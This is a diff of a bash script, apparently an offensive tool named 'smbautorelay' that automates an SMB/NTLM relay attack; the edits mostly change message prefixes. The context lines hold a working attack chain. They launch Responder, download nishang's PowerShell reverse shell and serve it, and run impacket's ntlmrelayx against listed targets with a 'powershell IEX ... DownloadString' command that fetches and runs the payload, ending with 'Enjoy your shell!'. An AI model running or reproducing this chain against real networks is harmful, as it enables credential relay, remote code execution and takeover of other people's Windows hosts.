@@ -108,9 +108,11 @@ function makeBck(){
 
 function checkProgramsNeeded(){
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
-	
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Updating apt...\n"; sleep 0.5; fi
 	apt update &>/dev/null
+	
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking for dependencies needed...\n"; sleep 0.5; fi
+	
 	programs=(tmux rlwrap python3 netcat wget xterm net-tools)
 	for program in "${programs[@]}"; do checkApt $program; done
 
@@ -155,7 +157,7 @@ function checkProgramsNeeded(){
 
 function checkResponderConfig(){
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Checking responder config..."; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking responder config..."; fi
 
 	SMBStatus=$(grep "^SMB" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')
 	HTTPStatus=$(grep "^HTTP" $(pwd)/responder/Responder.conf | head -1 | awk '{print $3}')
@@ -190,12 +192,12 @@ function checkResponderConfig(){
 
 function relayingAttack(){
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
 
 	tmux start-server
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to start Tmux server. Existing...\n"; badExit; else sleep 2; fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.5; fi
 	tmux new-session -d -t "smbautorelay"
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create Tmux session 'smbautorelay'. Existing...\n"; badExit; else sleep 0.5; fi
 	tmux rename-window "smbautorelay" && tmux split-window -h
@@ -203,7 +205,7 @@ function relayingAttack(){
 	paneID=0; tmux select-pane -t $paneID > /dev/null 2>&1
 	if [ $? -ne 0 ];then let paneID+=1; tmux select-pane -t $paneID; fi
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.5; fi
 	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m && tmux swap-pane -d && sleep 1
 
 	lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')
@@ -212,7 +214,7 @@ function relayingAttack(){
 		lport=$(($RANDOM%65535)); if [ $lport -ne $openPort ];then break; fi
 	done
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.5; fi
 
 	wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
 	if [ ! -e "$(pwd)/shell.ps1" ];then
@@ -222,16 +224,16 @@ function relayingAttack(){
 	else
 		echo 'Invoke-PowerShellTcp -Reverse -IPAddress '$lhost' -Port '$lport >> $(pwd)/shell.ps1
 	fi
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
 	
 	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "python3 -m http.server" C-m && sleep 1 && tmux split-window
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
 	
 	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
 	cp $targets $(pwd)/impacket/targets.txt
 	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
 
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
 	
 	terminal='xterm'
 	for ps in $(ps ax | awk '{print $5}' | sort -u | grep -v "\[\|\/" | awk -F- '{print $1}'); do
@@ -265,14 +267,14 @@ function relayingAttack(){
 	while read line; do if [ "$rhost" == "$line" ];then checkrhost=1; fi; done < $targets
 
 	if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
-		echo -ne "${blueColour}[*]${endColour} Authenticating to target $rhost "
+		echo -ne "${blueColour}[:*]${endColour} Authenticating to target $rhost "
 		for i in {1..3}; do sleep 0.5; echo -ne "."; done
 		echo -e "\n\n${greenColour}[:D]${endColour} Relay successful! Enjoy your shell!\n"; sleep 0.5
 	else
 		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.5
 	fi
 	
-	if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Killing Tmux session: smbautorelay\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Killing Tmux session: smbautorelay\n"; sleep 0.5; fi
 	
 	tmux kill-session -t "smbautorelay*" &>/dev/null
 	rm -f $(pwd)/shell.ps1 &>/dev/null
@@ -367,4 +369,4 @@ if [ "$(id -u)" == 0 ]; then
 	
 	goodExit
 
-else echo -e "\n${redColour}[:!] Super powers not activated!${endColour}\n${blueColour}[*] You need root privileges to run this tool!${endColour}"; badExit; fi
+else echo -e "\n${redColour}[:!] Super powers not activated!${endColour}\n${blueColour}[:*] You need root privileges to run this tool!${endColour}"; badExit; fi
